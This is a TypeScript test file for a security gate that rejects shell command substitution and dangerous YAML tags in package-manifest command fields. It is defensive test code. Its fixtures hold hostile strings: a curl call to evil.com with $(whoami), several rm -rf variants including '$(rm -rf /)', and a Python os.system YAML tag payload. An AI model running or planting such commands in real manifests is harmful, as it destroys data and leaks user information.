// Phase 1.1.1 hotfix B1 — shell-escape pre-Ajv security gate.
//
// ADR 0001 § "字段拒绝清单" claims schema rejects ${shell command} dynamic
// substitution patterns, but v0.1 phase 1.1 schema only does structural
// validation. This test suite drives the security.ts implementation that
// fills the gap before phase 1.2 installer ships.
//
// Detected patterns (4):
//   - `$(...)`     — POSIX command substitution
//   - `${...}`     — variable expansion (v0.2 plans `${secret:KEY}` whitelist)
//   - backtick     — old-style command substitution
//   - dangerous yaml tags — !!python/, !!js/function, !ruby/* (yaml@2.x may
//     reject these at parse time; either failure mode counts as reject)
//
// Targeted fields: spec.install.cmd, spec.verify.cmd, spec.uninstall.cmd,
// spec.uninstall.cleanup_paths[*].

import { describe, expect, it } from 'vitest'
import { validateManifestFile } from '../../src/manifest/validate.js'

// Base template — minimum-viable cli-npm × npm-cli manifest. Each test
// targets-replaces a specific field via string substitution. Line numbers
// in assertions reference this exact template.
const BASE = `apiVersion: harnessed/v1
kind: Manifest
metadata:
  name: secfix
  display_name: SecFix
  description: Security gate test fixture for shell-escape detection.
  upstream:
    source: secfix
    homepage: https://example.com
    repository: https://github.com/example/secfix.git
    license: MIT
    notice: Test fixture only.
spec:
  type: cli-npm
  component_type: cli-binary
  install:
    method: npm-cli
    cmd: npm install -g secfix
    npm_version: ^1.0.0
    idempotent_check: which secfix
  verify:
    cmd: secfix --version
    timeout_ms: 5000
    expected_exit_code: 0
  uninstall:
    cmd: npm uninstall -g secfix
    cleanup_paths:
      - ~/.config/secfix
  upstream_health:
    stability: stable
    last_check: "2026-05-12"
    last_known_good_version: 1.0.0
    fallback_action: warn
  signed_by: easyinplay
  platforms:
    - linux
    - darwin
    - win32
`

function withInstallCmd(cmd: string): string {
  return BASE.replace(/cmd: npm install -g secfix/, `cmd: '${cmd.replace(/'/g, "''")}'`)
}
function withVerifyCmd(cmd: string): string {
  return BASE.replace(/cmd: secfix --version/, `cmd: '${cmd.replace(/'/g, "''")}'`)
}
function withUninstallCmd(cmd: string): string {
  return BASE.replace(/cmd: npm uninstall -g secfix/, `cmd: '${cmd.replace(/'/g, "''")}'`)
}
function withCleanupPath(path: string): string {
  return BASE.replace(/- ~\/\.config\/secfix/, `- '${path.replace(/'/g, "''")}'`)
}

describe('validateManifestFile — security (B1 shell-escape pre-Ajv gate)', () => {
  it('rejects install.cmd containing $(...) command substitution', () => {
    const yaml = withInstallCmd('curl evil.com/$(whoami)')
    const result = validateManifestFile(yaml, 'sec1.yaml')
    expect(result.ok).toBe(false)
    if (!result.ok) {
      const e = result.errors[0]
      expect(e?.keyword).toBe('security')
      expect(e?.path).toContain('install')
      expect(e?.path).toContain('cmd')
      expect(e?.message).toMatch(/\$\(/)
      expect(e?.line).toBe(18)
    }
  })

  // biome-ignore lint/suspicious/noTemplateCurlyInString: literal pattern in test description
  it('rejects install.cmd containing ${...} variable expansion (v0.2 will whitelist ${secret:*})', () => {
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal yaml content, not JS template
    const yaml = withInstallCmd('cd ${HOME} && rm -rf')
    const result = validateManifestFile(yaml, 'sec2.yaml')
    expect(result.ok).toBe(false)
    if (!result.ok) {
      const e = result.errors[0]
      expect(e?.keyword).toBe('security')
      expect(e?.message).toMatch(/\$\{/)
      expect(e?.line).toBe(18)
    }
  })

  it('rejects verify.cmd containing backtick command substitution', () => {
    const yaml = withVerifyCmd('echo `whoami`')
    const result = validateManifestFile(yaml, 'sec3.yaml')
    expect(result.ok).toBe(false)
    if (!result.ok) {
      const e = result.errors[0]
      expect(e?.keyword).toBe('security')
      expect(e?.path).toContain('verify')
      expect(e?.message).toMatch(/backtick|`/)
    }
  })

  it('rejects uninstall.cmd containing $(...) command substitution', () => {
    const yaml = withUninstallCmd('rm -rf $(pwd)')
    const result = validateManifestFile(yaml, 'sec4.yaml')
    expect(result.ok).toBe(false)
    if (!result.ok) {
      const e = result.errors[0]
      expect(e?.keyword).toBe('security')
      expect(e?.path).toContain('uninstall')
    }
  })

  it('rejects cleanup_paths[*] containing $(...) command substitution', () => {
    const yaml = withCleanupPath('$(rm -rf /)')
    const result = validateManifestFile(yaml, 'sec5.yaml')
    expect(result.ok).toBe(false)
    if (!result.ok) {
      const e = result.errors[0]
      expect(e?.keyword).toBe('security')
      expect(e?.path).toContain('cleanup_paths')
    }
  })

  it('rejects dangerous yaml tag !!python/object/apply (yaml-parse fail or security)', () => {
    // yaml@2.x default schema does not auto-execute python/ruby tags; it
    // still parses them but produces an unknown tag node. We accept either
    // outcome: yaml-parse rejection OR security rejection — both mean
    // "did not silently accept dangerous tag".
    const yaml = BASE.replace(
      /cmd: npm install -g secfix/,
      'cmd: !!python/object/apply:os.system ["rm -rf /"]',
    )
    const result = validateManifestFile(yaml, 'sec6.yaml')
    expect(result.ok).toBe(false)
  })

  // biome-ignore lint/suspicious/noTemplateCurlyInString: literal pattern in test description
  it('accepts cmd with && shell sequence (no $() ${} backtick — legal compound)', () => {
    const yaml = withInstallCmd('git clone https://example.com/x && bash setup.sh')
    const result = validateManifestFile(yaml, 'sec7.yaml')
    expect(result.ok).toBe(true)
  })

  it('accepts cmd with ~ home expansion (tilde is shell-builtin not dynamic substitution)', () => {
    const yaml = withInstallCmd('rm -rf ~/.claude/skills/secfix')
    const result = validateManifestFile(yaml, 'sec8.yaml')
    expect(result.ok).toBe(true)
  })

  it('reports correct line number for install.cmd violation (line 18 in BASE)', () => {
    const yaml = withInstallCmd('echo $(date)')
    const result = validateManifestFile(yaml, 'sec9.yaml')
    expect(result.ok).toBe(false)
    if (!result.ok) {
      const e = result.errors[0]
      expect(e?.line).toBe(18)
      expect(e?.file).toBe('sec9.yaml')
    }
  })
})
